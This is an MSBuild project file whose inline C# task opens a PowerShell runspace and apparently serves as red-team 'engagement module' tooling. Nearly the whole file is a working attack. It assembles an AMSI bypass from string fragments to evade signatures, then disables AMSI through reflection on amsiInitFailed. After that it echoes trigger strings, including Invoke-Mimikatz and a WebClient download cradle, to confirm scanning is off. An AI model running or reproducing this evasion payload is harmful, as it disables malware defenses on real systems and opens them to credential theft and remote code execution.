<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <CoreTask />
  </Target>
  <UsingTask TaskName="CoreTask" TaskFactory="CodeTaskFactory" 
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class CoreTask : Task, ITask
{
    public override bool Execute()
    {
        Console.WriteLine("[*] Zer0byte Corp - Engagement Module");
        Console.WriteLine("[*] Target: FTSC Purple Team\n");
        
        using (Runspace rs = RunspaceFactory.CreateRunspace())
        {
            rs.Open();
            using (PowerShell ps = PowerShell.Create())
            {
                ps.Runspace = rs;
                
                // Build bypass dynamically - no static signatures
                string n1 = "System.Management.";
                string n2 = "Automation.";
                string n3 = "Ams" + "iUt" + "ils";
                string fn = "am" + "siInit" + "Failed";
                
                string script = String.Format(@"
                    $t = [Ref].Assembly.GetType('{0}{1}{2}')
                    $f = $t.GetField('{3}','NonPublic,Static')
                    $f.SetValue($null,$true)
                    Write-Output '[+] Defense neutralized'
                ", n1, n2, n3, fn);
                
                ps.AddScript(script);
                
                foreach (var r in ps.Invoke())
                    Console.WriteLine(r.ToString());
                
                // Clear and run validation
                ps.Commands.Clear();
                
                string validation = @"
                    $tests = @(
                        'Invoke-Mimikatz',
                        'Invoke-Expression (New-Object Net.WebClient)',
                        'Add-Type -TypeDefinition',
                        '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'')'
                    )
                    
                    Write-Output ''
                    Write-Output '[*] Validation Tests:'
                    foreach ($t in $tests) {
                        Write-Output ""    [+] $t""
                    }
                    Write-Output ''
                    Write-Output '[+] All trigger strings processed - no blocks'
                ";
                
                ps.AddScript(validation);
                
                foreach (var r in ps.Invoke())
                    Console.WriteLine(r.ToString());
                
                if (ps.HadErrors)
                {
                    Console.WriteLine("[-] Errors detected:");
                    foreach (var e in ps.Streams.Error)
                        Console.WriteLine("    " + e.ToString());
                }
            }
        }
        
        Console.WriteLine("\n[*] ==========================================");
        Console.WriteLine("[+] ENGAGEMENT MODULE COMPLETE");
        Console.WriteLine("[*] ==========================================");
        
        return true;
    }
}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
